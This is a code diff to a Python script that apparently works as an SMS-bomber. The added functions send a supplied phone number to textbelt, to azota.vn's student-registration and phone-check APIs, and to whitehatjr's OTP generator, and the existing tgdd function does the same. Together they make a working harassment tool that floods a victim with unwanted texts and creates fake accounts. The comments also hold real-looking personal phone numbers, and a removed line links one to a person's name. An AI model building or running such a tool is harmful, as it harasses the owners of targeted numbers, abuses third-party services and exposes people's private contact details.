@@ -251,5 +251,39 @@ def tgdd(phone): #phone = 0943687522
 	res = requests.post(link,json=json)
 	return(res,res.text)
 
-phone = "0913433155" #phuong khi
+
+
+
+# -----------------------------------------------------------------------
+
+def textbelt(phone): #+84943687522
+	phone = "+84" + phone[1:]
+	resp = requests.post('https://textbelt.com/text',{
+			'phone' : phone,
+			'message' : phone[3:7] ,
+			'key' : 'textbelt'
+		})
+	return(resp,resp.text)
+
+
+def azota(phone): # 0943687522
+	# dang ki tai khoan
+	link = "https://azota.vn/api/Auth/registerForStudent"
+	json = {"phone":"","fullname":"hovaten hovaten","password":"thisispasswd@"}
+	json["phone"] = phone
+	res = requests.post(link,json=json)
+	print(res,res.text)
+
+	# quen passwd
+	link = "https://azota.vn/api/Auth/CheckPhoneExists?phone={0}".format(phone)
+	res = requests.get(link)
+	return(res,res.text)
+
+
+def whitehatjr(phone): # 943687522
+	phone = phone[1:]
+	link = "https://code.whitehatjr.com/api/V1/otp/generate"
+	json = {"dialCode":"+84","mobile":phone}
+	res = requests.post(link,json=json)
+	return(res,res.text)	
 
